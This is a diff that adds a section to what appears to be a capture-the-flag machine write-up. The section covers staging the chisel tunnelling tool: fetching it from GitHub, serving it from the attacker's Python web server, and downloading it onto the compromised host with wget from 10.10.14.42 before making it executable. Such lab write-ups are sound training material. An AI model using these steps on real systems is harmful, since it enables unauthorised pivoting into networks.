@@ -136,4 +136,32 @@ Get the user flag
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/68aaed04-5670-48a5-9366-a60e44abf93d)
 
+Chisel
+
+GIT: https://github.com/jpillora/chisel
+
+Download chisel for windows using wget and chisel url
+
+    wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
+
+extract chisel 
+
+    gzip -d chisel_1.9.1_windows_amd64.gz 
+
+Open python server on your machine
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/6e7ac664-2ff0-4613-87c6-0fe65c996abe)
+
+Download chisel on frank machine 
+
+    wget http://10.10.14.42:8080/chisel_1.9.1_windows_amd64
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/f244d2d0-bc79-42d5-b1a3-b5f10575c626)
+
+    mv chisel_1.9.1_windows_amd64 chisel
+
+    chmod +x chisel 
+
+    
+
 
